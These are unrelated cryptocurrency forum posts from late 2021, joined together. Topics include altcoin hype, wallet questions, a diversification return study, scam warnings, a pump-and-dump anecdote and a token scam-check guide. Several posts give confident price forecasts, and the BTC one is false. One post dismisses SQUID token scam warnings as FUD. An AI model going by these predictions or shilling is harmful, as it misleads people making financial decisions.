Number 2... Its been hiding in the shadows, sharpening its claws and preparing for battle. Other networks have unrolled massive marketing campaigns and hyped themselves up too soon so they dont miss this bullish wave, but I think they were mostly unprepared. Im looking at you Cardano - so decentralized that no one seems to be orchestrating anything over there... and you SOLANA, so damn centralized in the hands of insiders, I wonder why people even bother. Tether is a ponzi sauce and these networks are hard tempura. Whilst they were being hyped, here is EGLD with its meager 6 billion market cap, running hackathons to ensure the most secure system possible and their time is now.

Number 3... with Elrond taking their time and creating a truly superior product, they will now release their Maiar exchange! Those who use the Maiar LPs and receive MEX will be rewarded and this is a massive PLAY for anyone who enjoys DEFI.

Number 4... The Elrond network will allow you to experience new Dapps and like funding a Kickstarter, will provide you the opportunity to financially support them during early levels of their unfolding.

Number 5... there are only 20milion coins! It bothers me how little people within this sphere truly understand the concept of market cap. I have had people argue with me that EGLD is already too expensive, but clearly they dont understand this principle either when they are buying a meme coin thats already at 40 billion. With 20 million coins, there is naturally going to be a much higher price point if market cap reaches higher.

Number 6... EGLD will reach a market cap of 75 billion eventually. The entire crypto market will pump until the end of the year and coins that have 70 billion market cap now, will have more like 150 billion. At that market cap, EGLD will be $2500 per coin easily and for anyone that got in early and farmed MEX tokens, they will see a serious multiplying profit if they play the pools right.

*Had to repost because of I uploaded the image directly*

According to the cycle floor model, expect at least a 150k$ BTC on the 15th December 2021 and a 10k$ ETH on the 11th January 2022.

You can those claims on those links:

BTC: https://imgur.com/Qt4UARE

ETH: https://imgur.com/rNJtCP8

The model is basically an moving average of the prices from 4 years ago multiplied by 10. It has been quite accurate in the past and been only wrong for a few days almost always because of some huge unpredictable news or event (like COVID).

Thus far I have managed to resist the urge to FOMO into projects that are already mooning but all this memecoin talk has left me with a hankering to gamble on a couple of low cap coins. I don't mind potentially losing 100 bucks on a project if it means possibly catching the next wave.  



  

Im much more of a holder than a trader so I keep an eye on the markets, but I dont plumb the depths of coinmarketcap like I used to. So Im open to all opinions. What are your longshots? Something with a relatively low market cap that still has the potential to blow up.

MOONs are an ERC-20 token, which means MOONs must exist on the Ethereum blockchain. And since they are ERC-20 tokens on the Ethereum blockchain, Reddit MOON Vault addresses should also exist on the Ethereum blockchain.  

However: When I search my MOON wallet address on Etherscan.io, I get nothing in return, only the "invalid address" error.   

Moving on, I dug through a few MOON transactions I have and attempted to search the TxnHash of those transactions (TxnHash is a unique string which identifies a transaction on the Ethereum blockchain).  

Again, no dice.  

I can see the MOONs token page on Etherscan:  
https://etherscan.io/token/0xe1ca72ff3434b131765c62cbcbc26060f7aba03d  

And I do see plenty of transactions, but none of the destination addresses appear to be Reddit MOON vaults.  

I can dig through the transactions from that page, but I never end up anywhere that looks like a Reddit MOON vault.  

Does anyone have any clue how to find MOON vaults on Etherscan (or any blockchain explorer)?  

Thanks.

**tl;dr**

* Diversification in Crypto seems to be an alright concept.
* Your investment can only go to 0% at the worst, while the gains are uncapped. 
* Investing during a bear market is damn pretty lucrative regardless of the method you use.
* Ethereum alone is pretty damn good too.
 

Tiny bit of backstory and what the inspiration for this research was, I saw an article called [Here's How Much You'd Have if You Invested $1,000 in the Biggest Cryptos 3 Years Ago](https://www.fool.com/the-ascent/cryptocurrency/articles/heres-how-much-youd-have-if-you-invested-1000-in-the-biggest-cryptos-3-years-ago/) from The Motley Fool (sorry).   The TL;DR of the article was If you put $100 apiece in those 10 cryptos three years ago, your $1,000 investment would now be worth $7,134.93 -- an increase of 613%.  Youll also see that a **couple of coins were doing most of the heavy lifting,** while others returned negative amounts.  This got me thinking about mapping this out for other coins and other time-frames.

**Methodology**



Coinmarketcap has historical price data so it was easy enough to scrape that into a spreadsheet and get to work with some fancy formula work. https://coinmarketcap.com/historical/  I also did my best to remove stablecoins and wrapped tokens.  Keep in mind this is if you spread *equal* amounts throughout the amount of crypto noted.  I tried to pick peak bear and bull markets as start dates.  Ive also noted the market conditions.  The end date is relatively arbitrary other than that were in a bull run right now and its the most recent data we have available.  Here is what I measured, against the end date (10/31/21) and marketcap ranking at the time of the Start Dates.

* Top 20 Only
* Top 100 Only
* Top 101-200 Only
* Top 200

**Results**

Enough blabbing, let me present the data.  The percentages are RETURN percentages.  (Negative numbers indicate a negative return, positive numbers indicate a positive return)


Start Date|End Date|Top 20 %|Top 100%|Top 101-200 %|Top 200 %| Market Conditions
:--|:--|:--|:--|:--|:--|:--
12/17/17|10/31/21|37.80%|287.04%|72.01%|226.75%|Peak Bull Market 2017
5/27/18|10/31/21|369.23%|160.05%|463.09%|265.66%|Heavy Bear Market 2018
12/27/20|10/31/21|323.31%|597.06%|845.98%|725.76%|Bull Run Start 2020
3/28/21|10/31/21|54.30%|51.51%|5.93%|28.46%|Peak Bull Market 2021 (BTC)
5/9/21| 10/31/21|-11.45%|-9.48%|-11.89%|-10.86%| Peak Bull Run (DogeCoin) 2021
6/13/21| 10/31/21| 40.08%|77.28%|58.10%|68.07%|Peak Bear Market 2021



Smoothing that all out for an average:


Average Top 20 % |Top 100 Average % | Top 101-200 Average % |Top 200 Average %
:--|:--|:--|:--
135.54%|193.91%|238.87%|217.31%


And, of course, we have to compare these vs the King and Queen of crypto.  First, the same for BTC and ETH:


Start Date | End Date| BTC Price | ETH Price | BTC % Return | ETH % Return
:--|:--|:--|:--|:--|:--
12/17/17|10/31/21| $19,140.76 |$719.98 | 220.36% |495.58% 
5/27/18 | 10/31/21| $7,368.22| $572.67| 732.21%| 648.79%
12/27/20 | 10/31/21| $26,272.29|$682.64| 133.40%| 528.16%
3/28/21|10/31/21|$55,950.75|$1,691.36|9.59%|153.53%
5/9/21| 10/31/21|$58,232.32|$3,928.84|5.30%|9.14%
6/13/21| 10/31/21|$39,097.86| $2,508.39 |56.83% |70.95%


And now the Average Smoothing:


Average BTC Return | Average ETH Return
:--|:--| 
192.95%|317.69%



For those interested in the raw data, check the tabs at the bottom of the sheet [here.](https://docs.google.com/spreadsheets/d/1WFtyf9m166Xne_oRxEyVSWZ4m6uAO6ZqdK5O2eUpapE/edit#gid=0)


**Conclusions:**

* On average investing in the top 101-200 Marketcap coins returned more profit than just just doing the top 20 or even the top 100, or even all in on BitCoin.
* Diversification appears to not be a terrible idea.  Some coins went to almost nothing, but then we also had some that went 3000%+, which makes up for a hell of a lot that went to 0.    Interesting, yes?
* Bear market investing is a great way to make ridiculous returns.
* Maybe burying the lede here, but Ethereum kicked all of them in the taint.

**Limitations**

* Need more data points for comparison.
* Past performance is not a guarantee of future performance.
* This is not financial advice.  
* Entirely possible that different data sets provided better returns (e.g. Coins 301-400 might have returned more but I didnt test for that).
* Almost certainly missed some Stable and Wrapped coins in the stats.  It shouldnt matter *too much* on the end numbers.
* Fees and such on moving all that stuff around eventually might eat up the gains (?)
* I have no recommendation on Exit Points.  Perhaps you might.
* In 2017 the Alt Market was seemingly not as robust or lucrative or stable as it is now.  It might be helpful to throw that entire datapoint out since the markets are more mature now.
* Probably tons of stuff that I didnt do that I will learn about from your comments :)
* Bitconnnnneeeeeeeeeeeect

Hey Im new idk if This is the right place to post this, If not please let me know. 

But anyway Ive been trading crypto for around 6 months now. Mostly large coins Like btc eth ada etc. But I wanted to try something New 

So I was looking around on youtube and saw all those 100X coins low cap coins videos. 100X seems a bit much but even like 5X would be great. But I didnt really want to buy something that sombody on the internet told me about. And I also didnt want to buy a meme coin. So I did some research Im not that good with this yet ;), Thats why Im here, but I found this coin called altBase 

It has an exchange for only altcoins and they are working on an app as well

Just want to hear someone elses opinion

(Sorry if my english is bad)

Thanks

I tried swapping my x2p on pancake swap. Had a high slippage % too. But it just wont swap. I texted on the TG group if someone has faced a similar issue. I searched for similar previous queries, i found them but the chat was no longer available. It was strange that all chats where people were asking how to sell was deleted. Then after 5 minutes i didnt see the TG group i posted in anymore. Seems like they kicked me out.
So in short they are just getting you to put in your money and then telling you to fuck off.
Someone should really inform on that TG group that its a scam.
If you don't believe me, try searching for terms like "cannot sell/swap x2p". All chats are deleted

I am still subscribed to the X2P announcement group where they have the link to the X2P community telegram group that i was a part of. It now says the chat no longer exists.

Someone reading this should really make people aware on the community group that they have invested into a scam.

So I finally have an OK amount of BTC and I want to move it to cold storage. I was thinking about getting a Nano Ledger but what happens if I lose the USB stick or a password? I was also reading that they had a leak last year and people's info got exposed? I honestly don't trust Ledger at all, and I was thinking (ideally) to have the coldest possible storage available, free from giving any information or working with any third parties.

I was also reading that paper wallets can achieve this - moving the risk to potentially losing the paper, but with the benefit that no other institution or hardware will need to interact with the BTC in order to achieve the storage. So, I created a paper wallet with bitaddress, and this is where my n00bness shows, but I don't really know how to withdraw once I deposit some BTC. The paper gave me a public key and a private key, the public is to do some deposits, I know, but how would I use my private key to withdraw and/or access the funds? I've only moved BTC through brokers, where they only ask me to input the public key as a deposit and click to send...

Any advice would be appreciated. I'm still learning and there's much I do not know, but I do believe in the Not your Keys, Not your Bitcoin philosophy.

If you've seen the news lately, you probably know that there is an island in the ocean called Vostok which is mysteriously blacked out on google earth. Even more if you switch to map view it disappears altogether.  Also, the 13th anniversary of the Bitcoin whitepaper has reignited the conversation of "where in the world in Satoshi Nakamoto?" (Put your tinfoil hats on). I believe that the answer is on Vostok Island. 

If you were a multi-multi billionaire, where would you go? Would you go to a nice secluded private island with white beaches? Yup, Vostok has that. Would you make sure you were surrounded for the rest of your life by tons of boobies? Yup Vostok has brown boobies, white boobies, and red-footed boobies all over the island. Would you pay Google Earth to black out your private island? Yup, obviously that's what happened on Vostok. 

Even just look at the name. If you just take the name Votok Island BIC (black in center). You can rearrange the letters to spell Bitcoin So Valdk and I believe Valdk is Russian for "hidden on this island" (trust me, you don't need to fact check that). 

Basically Satoshi is real and he's chilling on a private island eating boobies every night like a freaking G. Someone with a boat go find him and shake his hand.

So here I am today, watching my little brother play Roblox and he shows me these items for sale for Robux ranging from anything between a few $s to, get this, $7 MILLION DOLLARS!!! 

If you want to take a look yourself, look at the average price here of the item I used as an example: [Dominus Empyreus](https://www.roblox.com/catalog/21070012/Dominus-Empyreus)

If items are being sold like this, I can only imagine a future where these will be in an NFT space and Roblox perhaps has their own Metaverse on the Ethereum networkor perhaps even a Robux cryptocurrency aswell?

Now these are only my personal thoughts but interested to know what everyone else thinks!

When trading on PancakeSwap or UniSwap, I notice that the delta between the value of coins I give to them vs the value of coins I receive is huge.  

For instance, when I traded BNB for Floki on Pancake today, at the time of the trade there was a $13,000 difference between the value of the BNB I gave and the value of the Floki Inu I received .  I had 4% slippage set and I believe there is a 3% transaction cost for the Floki Token that goes into a marketing wallet or something.  Given the dollar amount of the transaction, it seems like Pancakeswap just ate 9%.  What gives? And where do I see the amount that was transferred to the Floki Inu marketing wallet? 

[https://bscscan.com/tx/0x39c5f57b53d502e5108e85a5d579059f7bf5c61b1023f7c6f410b21340c5cfb8](https://bscscan.com/tx/0x39c5f57b53d502e5108e85a5d579059f7bf5c61b1023f7c6f410b21340c5cfb8)

So I fall in the category where the majority of the people here tend to fall, which is people that try to build a portfolio for the short to middle term with the goal of making some profits.

But as I am also a HODLer, I like to HODL coins and my favourites are of course BTC and ETH.

Sadly when you can invest only 500 to 1000 USD you can't really turn a profit by holding only the 2 big ones, so naturally I turned to altcoins.

Aaaand I've got myself into a mess: I bought ONE because it's the one you need, I aped into SHIB and PANDA because they can go 100x in a day, i bought MATIC, ADA and DOT because they are the most solid projects and so on so so forth.

I ended up with 20+ altcoins in my bag.

I'm an extremes guy, my mind is either all in Bitcoin &amp; Ether OR diversify like there's no tomorrow.

How do I find a balance? I have a few projects I strongly believe in but the rest I bought just because they are shilled like man, strong af or just...random.

Shill me the next big thing I should buy or just advice me so I can let go of this FOMO feeling !!!

Assuming I am learning in this current market cycle and can only do better in the next market cycle, when is this due to happen and I can really start to make some profit and real life changing money. 


Right now the market is going wild and from research (I know big words) it's not the best time to invest but more to sit back, watch and enjoy the gains...

Unfortunately, having not made massive gains and I don't think I will in this cycle, when is the next cycle to happen ?

# What is it?

MultiVAC (MTV) is a next-generation public blockchain platform designed for large-scale and complicated decentralized applications. With the same node scale, MultiVAC can achieve two orders of magnitude credibility and over **10k TPS**, which will fully meets the needs of large-scale applications. MultiVAC separates transactions and smart contracts/computation and provides an optional slide of CAP for DApps to make their own infrastructure of performance and decentralization level. There will be an economic model and an efficient free market in which Nodes can benefit from bookkeeping, computing and saving, leading to obvious increasing and network effect. The main points of this blockchain are:

* **All-Dimensional Sharding**: MultiVAC breaks through the limitations to blockchain scalability by developing the worlds first fully sharded blockchain with sharded transmission and storage.
* **Blockchain Trilemma Flexibility**: MultiVAC pioneers flexible sharding, allowing DApp developers the flexibility to trade off between the impossible triangle of decentralization, scalability and security.
* **High TPS &amp; Infinite Expansion**: MultiVAC maximizes throughput on every shard while maintaining decentralization and security, allowing decentralized blockchains to achieve industrial capacity

MultiVAC's vision is to enable large-scale commercial DApps to integrate smoothly into our ecosystem, enabling everyone to quickly and easily use blockchain applications to improve their work efficiency and quality of life

**Fun fact**: The name "Multivac" derives from the name of a supercomputer present in one of the science fiction novels written by Isaac Asimov

**source**: [MultiVAC official site](https://www.mtv.ac/)

# How does it work?

*"MultiVAC is designed for performance and flexibility, pioneering a miner selection model that redefines sharding and smart contracts".* But what is sharding and what are its advantages? Sharding is the only practical and fundamental way to scale blockchain from the bottom up, while at the same time preserving its original intention of being a decentralized ledger open to everyone. It is the deepest level solution that makes the fewest compromises when bringing performance benefits. The other solutions have severe limitations. DPoS violates blockchain's original 'core value' of decentralization by reverting back to semi-centralization. Off-chain solutions such as state channels require trust relationships between the client and the state channel provider. Sharding is the only solution that has been proven to sustainably improve TPS in a decentralized, secure manner. MultiVAC believes that the most robust scaling solutions are built bottom-up from the infrastructural ground level. For this reason, MTV use blockchain sharding as their core scalability approach. The list of the advantages is the following:

* **Linear Scalability To Infinity**: based on fully sharding design, all nodes only need to process the data in their shard, the performance of the whole blockchain network can increase linearly, more shards, higher scalability, it can be infinitely improved.
* **VRF Dynamic Re-Sharding**: on the miner and computing level, MultiVAC pioneers VRF dynamic re-sharding, organic shard splitting, an innovative PoS approach, and others to ensure the shards'security and self-growth capacity.
* **Distributed Storage Scheme based on Merkle Trees**: the ledger is stored in an innovative structure based on Merkel trees. The miner and storage nodes mechanism separates the physical storage and control rights of data which can provide a high level of decentralization and scalability.
* **Fair Mining By Everyone**: lower miner threshold and everyone can join in the network easily. Without any special miner and competition, your laptop or any ordinary PC with dual-core and 2GB RAM can participate in mining.

**source**: [MultiVAC official site](https://www.mtv.ac/)

# Where to store it?

The best hot wallet for MTV are MyEtherWallet, TrustWallet, Atomic Wallet and Exodus. If you want more security, a cold storage like Ledger or Trezor is the right choice.

# Pros&amp;Cons

\*DISCLAIMER\* These lists are subjective, it depends from person to person

**Pros**

1. Wide array of use cases
2. Great devs team
3. High speed transactions
4. Juicy staking feature (16% APY)

**Cons**

1. Its product is still under development
2. Many competitors

Anybody else listen to this fella? I have found his podcasts to be pretty insightful about crypto. His newest podcast - Episode 2980 16 Things Bitcoin and Crypto Have Made People Aware Of is worth a listen. 

Episode 2955 My Crypto Views And Recommended Resources 7 Years In is also a good listen if you are new to crypto. Some advice into what to look at and how to store it. 

His podcast covers a lot of other topics too, some are political, running a homestead, health, prepping, all sorts of topics. Hell Ive heard him talking about ecology (topsoil erosion). 

Feel free to comment about anybody you listen to who has helped you become more informed about crypto.

So I am living in the US and trying to find a way to purchase some MetaHero. Its not on any major exchanges so it's proving a windy road.

Based on some YouTube tutorials, I set up a Trust Wallet and deposited some $ in the form of a BNB purchase (hoping to then use that to purchase HERO on Pancake Swap). 

Ultimately my location seems to be making this route impossible, and now I'm just struggling to get the money I have tied up on the Binance Smart Chain OUT of that trust wallet and back onto a basic exchange like Coinbase.  
Anyone know an easy way to do that or where I can find the info I need? MANY THANKS!

Thirteen years ago on October 31, 2008, the first ever Bitcoin Whitepaper was published online by somebody using the pseudonym Satoshi Nakamoto.

To this day, who is Satoshi Nakamoto remains unkown. Even he said that Bitcoin will reach his peak in 20 or more years. 

Im sure that in 20 years there will either be very large transaction volume or no volume.
 Satoshi Nakamoto

So in the name of Bitcoin birthday and Satoshi legacy, what do you think on what is he doing now?

On April 26, 2011, Bitcoin creator Satoshi Nakamoto sent his final emails to fellow developers in which he made clear he had moved on to other projects, at the time handing over a cryptographic key he had used to send network-wide alerts.

On what projects did he moved on? Will he return ever again? Or he will remain anonymous forever?

Fear of missing out (FOMO) got me recently. I jumped on some coins that pumped heavily. With a terrible result, obviously. I lose some amount of money that really didn't feel well. Even though I know it, fomo got me and it went south for me.

So please all of you try to prevent this. I know when you read this advice, you think "of course". I think that too, still felt for it.

Trust your coins, trust your investments and know that all of them will have their moment if insane pumps somewhere in this bull market. Just wait.

Patience remains key. Wait, don't fomo, invest in good coins, stake if you can and let time pass and make you more wealthy.

Happy gains!

I see a lot of FUD around the SQUID token recently:

* "stop it's just a rug pull"
* "it already went to 0"
* "you're an idiot, stop buying"
* "you can't even sell it"

These are just a few of some of the comments I have been hearing. ALL OF THE ABOVE IS JUST **FUD**, AND HERE'S WHY.

&amp;#x200B;

You can see in the chart above that SQUID has been testing support at the bull market support level. It subsequently HELD support (extremely bullish) and now it looks like it might break out. According to my channel (in yellow in the chart), I am expecting a new ATH by the middle of November and $100k by EOY.

Hope my TA was useful. 

Not financial advice tho

Solana flipped Cardano in the top crypto rankings recently and nothing changed as a result. When Cardano flipped back, nothing changed again. It's like the rivalry of Coke vs. Pepsi, they're both still here (along with a handful of really good micros)

Sure some people may have made money (if they sold), but the future is wide enough for multiple blockchains that operate with each other, rather than as silos unto themselves.

The haters and their bile-laced spit will eventually die down (probably not in the comments below). The number of DEXs, dApps, and defi providers will consolidate. 

But there won't be one blockchain to rule them all because we can all agree, no one in crypto wants another Microsoft. No one.

I know that opinions are very divided in this sub about crypto youtubers and how most of them are just scam artists getting as many pump and dumps done as they can but I know theres a couple this sub like.

I was wondering what the views are on AltCoin Daily. Ive only seen him today and watched a couple videos. Im not new new to crypto and I always do my own DD but was wondering other peoples views on him? 

I dont think YouTube is very reliable for crypto information but sometimes you can find gems in the rough.

I got an email from my fraud security company this morning saying that the Coin Market Cap login info got stolen. I havent seen anything from them yet. If you use that info anywhere else, it would be smart to switch it like right now.

I dont have much else to say, but this wasnt enough words. We had some ATHs yesterday but the greed index is still pretty average. Thats crazy. Super bullish IMO.

Also bullish is this new cow looking thing that my mama cow had yesterday on my farm. Looks like a dude cow to me. Im really bullish on him.

Hey guys, I'm new to the cryptoverse and have some questions. I'm sure there have been a lot of these recently so sorry if I'm adding onto the stack! I'm currently using Coinbase Pro, is it safe to keep my crypto in their wallet? Or is there another storage option that is better? Also, I know Coinbase doesn't have the largest offerings to invest in. What are the best platforms for finding and buying into crypto? I'm interested in the fractional alt coins. (Trying to find the next Shiba, lol) I've heard of Uniswap and Pancakeswap? Are those good places to look for new coins? Any insights are appreciated!

Tried to ask this before, going to reword and try again.

I set up metamask and tried to move BNB from binance to metamask. 

I chose the BSC network, but I believe I copy and pasted my coinbase wallet address by accident

On bscscan it shows the same address on both networks:

 Etherscan

 https://etherscan.io &gt; address &gt; 0x785DFE4C193Df54B199269f4B4DFa023E27f6D49**Ethereum**

#### BscScan

 https://bscscan.com &gt; address &gt; 0x785DFE4C193Df54B199269f4B4DFa023E27f6D49**Binance Smart Chain** 

It still shows the $ balance on the BSC.

Is the money gone or is there a way I can get to this wallet?

Dear cryptocurrency members,

I see a lively debat SEVERAL times a day about what amount to spend on crypto and what is a safe suggestion and what not. I think we all get it by now: investing 10% of your gross/nett income is a safe way to build and keep a low risk of losing money while keeping your wife (or husband) happy and the house to yourself.

&amp;#x200B;

Can we stop this ongoing thing? We are discussing these principles in a void, where people live in 3rd world countries, 1st world countries and everything in between. Countries with mass-inflation, deflation, crypto-fear and crypto adoption. There is no SET OF RULES to follow. It is all personal.

&amp;#x200B;

For me, even if some would say it's not a wise investment, I use crypto as a way of saving. I have never been SO dedicated to putting money to the side that I would have spend on other things. I am horrible at saving, but because of the excitement of the cryptomarket, the diverse projects, the discussions surrounding it, I am eager to finally put some money to the side. Even if I would lose half (which would suck), I would still have more money saved than I would have by using the bank.

&amp;#x200B;

I am thankful for the tools being offered by technical developments to save money in a way I can provide something good, something I see a positive future for. All hail crypto!

Please let me explain how.

1. Both Dogecoin and Shiba Inu are in the top 10 cryptocurrencies by market cap.
1. Therefore, to be in the top 10, all that it takes is beating at least one of them.
1. Having room at the top shows that the market is far from being saturated or reaching maturity.

In fact, depending on who you ask (i.e. "arguably"), anything other than BTC and ETH is dubious for the long term, centralization, or adoption. BTC does not have smart contracts (Taproot coming soon), and ETH has high fees and few TPS. Both need to evolve, have plans to evolve, and most likely will evolve, being far from maturity, i.e. still early!

There is still plenty of room at the top for clever teams creating new blockchains (or improving existing ones, in technology or in public perception). However, the time for doing that singlehandedly is probably over, i.e. not-so-early...

PS: I would have used the "hopium" flair, if available.

I've noticed a lot of discussions around moon distribution so I checked my vault and no updates. 

While trying to understand how it works, I've notice that I didn't (re)joined the community. 

I took a break (left the community) some months ago because I was checking the phone every hour and thought is good to take a break. I took part of moon distribution in July for example. 

Time passes and I honestly don't even remember when I got back into lurking again, but my guess is that when the (small) bear market stoped at the end of July. The break was not working because is to addictive and I was manually checking the posts within the community everyday, because of this new bull cycle.

Today I rejoined the community (official) and I want to ask if this may be the reason I've missed all distributions? 

PS: is ok to take a break from charts, but not from this community - HODL, DYOR.

A little back story first. The company i work at is bit of a dead end so i decided to quit. Im still young so no stress. The reason i quit was like a said because of the dead end but also because i would like to learn more about crypto. 
So i came in at work for a talk with my boss about the resignation. Then he started talking about crypto, he heard from someone else that i " know" things about crypto, so he was hoping i would tell some more. A little later he told me that he runs a pump and dump group with 14+/- other multi-millionaires. He then explained that 1 guy in the groups picks a coin, that same guy gives a time for when they have to buy the specific coin, then when they all bought the FOMO kicks in and they would all sell at the top. Everybody (i hope) knowns that pump and dump is a scheme where millionaires make even more money by manipulating the " normal" people. 
So ofcourse i told him that he was commiting fraud and he was ripping of people that probably worked hard for their money. 
He didnt seem to understand that?? Like.. how?....
Does he think the money he makes from that comes right of a money tree or something???
So i became frustrated, a little angry even, but i had to let it go because he really didnt seem to understand.

I have been the victim of a pump and group too. 6 years ago (young and dumb) a friend and i decided to try it, lost a little money, but stopped because we saw it was a scheme. Not much harm done.

And now my boss tells me, like its nothing, that he is running a pump and dump group with other multi millionares.

I am trying to let it go.. but what are the odds to run in to someone that tells you that he is running a pump and dump group....with 14 other multi-millionairs

Any suggestions on what to do? Correct me if im wrong.

Hi everyone. I have been exploring new emerging coins the last days on coinmarketcap and I am trying to filter out crappy coins and scams. However, almost everytime I find a coin and open the contract either on bscscan or ethscan, I see the same picture over and over again:  


[Screenshot of the holders for the coin PolkaWar](https://preview.redd.it/0rrq9b94ydx71.png?width=1277&amp;format=png&amp;auto=webp&amp;s=cbbffdb1cac249f354fbd52537a4f0508a2bc3cf)

I have read in the past that seeing there PancakeSwap or SushiSwap or any DEX there, that that address corresponds to the liquidity pools from the DEX and that that is normal, but what about the first address in this case that holds 80% of the coins? Is this okay or not? And if not, what is a "healthy" percentage of holdings?
-------------------------------

So obviously BTC is the grandaddy, and ETH is the dad/mom. Let's have a look at some of these other top 50 children, how does your opinion differ from mine? :)

BNB: I'm not interested, good for making gains but not good for decentralization. 

Tether: I keep tether for as little time as possible trading, mainly trade by flipping alts around and cheeky short-term margin trades. I think holding/staking tether for long period could be risky.

SOL: don't know a lot about it but I own some

ADA: I own ADA but I'm not sure it will the ETH killer

DOT: \^

Ripple can suck my decentralized balls

SHIB/DOGE..... holy crap. I honestly dunno what to think about these. I guess the hype train could continue, but for how long who knows. they might stay up in the top 20 for a few years simply from e**X**treme hype, but i don't touch 'em, unless I'm shorting on margin. it's weird that coins like NANO and XLM are so unpopular, but that's the world we live in I guess. get off my lawn you bloody shib army

ATOM: pretty cool, hodling

ICP: pretty shit, fucked tokenomics, fucking **M**agnets, how do they work? bagholding

POLYGON: Kinda cool I think, but a ripe arena for scams and rug pulls, hodling

CRO: good potential, i'm staking CRO and have a crypto dot com VISA card, many people will want to use top-up crypto debit cards so i'm bullish on c**R**ypto dot com coin

Swappy coins: (CAKE, UNI, SUSHI etc,) wicked concept, most people just speculate on the tokens though and don't use the networks much. I don't use their features, so I don't own much.

NFT/Gaming coins: Viable concept with an interesting USP and unique use of NFT items rather than just "I own the Mona Lisa, but you can see it online" that most NFT art is, I own MANA, ALICE, ENJ, reasonably bullish

Privacy coins: fight club innit, read between the lines

my top 5 would be BTC, ETH, MANA, CRO,

Peace my crypto friends, may the moon smile down upon you. Or hopefully up in a few months. We'll wave to Bezos as we fly past his spaceship. Or flip him the bird.

With so many new projects coming out, the hopes of getting into a moon-bound token are high. I dont want to continue using ETH gains to pay $100-130 in fees on uniswap trying to put $200-300 in smaller cap coins. 

Instead of figuring it out with my own money I thought I would ask you brilliant souls. Would wrapping my ETH before making a play into other assets lower gas fees? Or, would I end up spending about the same since I would be doing multiple transactions? Ive heard complexity of transaction and network congestion cause high fees. But Ive tried trading after 11:00pm UTC when fees are supposedly at their lowest, and its still demoralizing.

A recent large-dollar funding round by Securitize signals that security tokens may be poised for a comeback.

If so, more private companies will bypass traditional initial public offerings (IPO) and instead use blockchain technology to digitize the capital-raising process. Some in the industry now go so far as to predict a sixfold increase in the total dollars raised using such funding methods over the next four years.

Securitize, which helps private companies raise money by issuing tokens, completed a $48 million Series B fundraising round on Monday. Morgan Stanley and Blockchain Capital co-led the round, which was oversubscribed.

While this niche failed to live up to the hype of the 2017-2018 cryptocurrency boom, several firms interviewed by CoinDesk said they expect the security token industry to finally take off on a global scale, citing strong demand from issuers and investors. Security tokens are digitized versions of traditional instruments such as stocks and bonds. Some even expect this industry to surpass the market volume for cryptocurrencies in the next five years.

In terms of proceeds, I watched [in this video](https://www.youtube.com/watch?v=7pPo1dslGCI) that the global security token market could reach $3 billion by 2025, growing at 56.9%, compounded annually, according to security token marketplace Area2Invest.

Seeing the recent squid game token pump again 370% in the last 24 hours I ask myself and you fellow crypto enthusiasts and investors and all of us others - dengenerate gamblers (haven't forgot about you... no, no, no) 

Why there is no fun in the blockchain anymore ? 

Everybody is serious like they gonna make millions, drive lambos and do a first rate blow and hoes.

What is been missing is something like new applications of the technology like special smart contracts to do stuff like squid game lottery? 

For example:

One of the investors in ICO is selected at random and  does the rug pull by himself.



Go forward and flash ideas like this bellow.

Hello, Im new to crypto, Ive heard about Bitcoin for years but just managed how to buy in my first crypto investment a couple of months ago. 

I tried going in a conservative way, meaning having 70% Bitcoin/eth and 30% smaller coins and one or two shitcoins.

Investment has already proved to give higher gains than I could wish for in a bank or stock. 

This got me wondering, how much money do you guys consider safe (in percentage of your total savings) to have on cryptocurrency?? 

Im tempted to go in with more money (Im only 5 or 6% in with savings) but my conservative self has me on second thoughts.

I know we all have different risk aversion so. What do you think? What is your percentage?

Hi, I am interested to hear your opinion about Pawthereum. I came across it by accident in the comments in this community and I've been following it lately. It's picking some good traction, the price is increasing day by day and it has a good cause, donating to pet shelters. My gut is telling me that this coin can reach 0.10 cents really soon and maybe go even higher and it can be a good investment or at least to gain some capital for investing in some other coins. Really interested about what you think :)

Im curious to know what would you choose, $1 Million in fiat or $100k in crypto? Obviously, you cant spend the $1 Million in crypto. Moreover, you can choose in what coins to spend those $100k worth of crypto. What would you choose? And what coins would you buy if you choose $100k in crypto?

Personally, Id choose $100k in crypto to expand my portfolio, Im here for the long term and all I do is HODL (while taking small profits). Since I already have a lot of ETH and BTC, I guess the majority of that $100k would go to small cap coins. However, I would still buy some BTC and BTC since you can never have enough.

Its meme coin season, and that means SCAM Season.

If you're new to tokens and meme coins here's what you should know/do:

**^(1)** **First steps)**

You stumble upon a token which looks like a good investment:

* Look them up on [coinmarketcap.com](https://coinmarketcap.com), on there you'll be presented with the token, a website, the whitepaper and the contract.
* Take a look at the website. Make sure its a real and functioning website, evaluate it. Try to find who's the team/devs behind the project and make sure they are real (they'll most likely have social networks like twitter, linkedin, facebook etc.).
* The Whitepaper is a **document released by a crypto project that gives investors technical information about its concept**, and a roadmap for how it plans to grow and succeed. Check the whitepaper if you're really into investing on this coin, make sure its a legit whitepaper.
* The Contract is the address/chain (you can find it on [coinmarketcap.com](https://coinmarketcap.com)) in which your token is in. If you click on the address it will take you to a website where you can check more details about that token. If you go on "Holders" you can check how's the token distribution. If its a scam coin, most likely there are addresses with a large amount of those tokens (something like 50% or 80%). Also you can go into "comments" and check if there are people saying its a scam or people saying you can't sell.
* Check their social medias. They will most definitely have twitter or reddit or some other. Look them up, check if its legit and if its just not bot accounts.

**^(2)** **More in-depth)**

After the first steps, you should already have a decent idea on what you're into, but you should check this next steps:

* [honeypot.is](https://honeypot.is) \- In this website you can look up your token address (the address you find on coinmarketcap.com) and they will tell you if the token is a honeypot (honeypot is when your token is not sellable, meaning you can't sell it and you're stuck with the tokens).
* [Tokensniffer.com](https://Tokensniffer.com) \- In this website you can look up your token address and they will tell if the token is 0/100 High Risk, if it is, its probably a scam. This website is still not very accurate, a token like dogecoin appears 35/100 High Risk, although we all know doge is legit. Just make sure your token has checked the "Token is sellable" and its not 0/100.

**^(3)** **Final analises)**

Now that you have checked your token you have to decide if its a good investment.

Note that a meme coin has no real use cases, its just a meme, therefore there's nothing going on for it other than good marketing and "spread the word".

Educate yourself everyday, watch youtube videos, research on reddit, on twitter, on google. Stay away from hyped coins.

Be careful around crypto space, don't trust anyone and DYOR before getting into a coin.

**Trust the numbers, not your guts.**

Noticed how popular loopring has been around here and I think it's a great idea with a great future. Vitalik Buterin had voiced his support in both layer 2 and Bitcoins lightning network so I thought it would be worth discussing some other pretty cool L2 and lighting projects that are doing some  great things.

1. Dydx

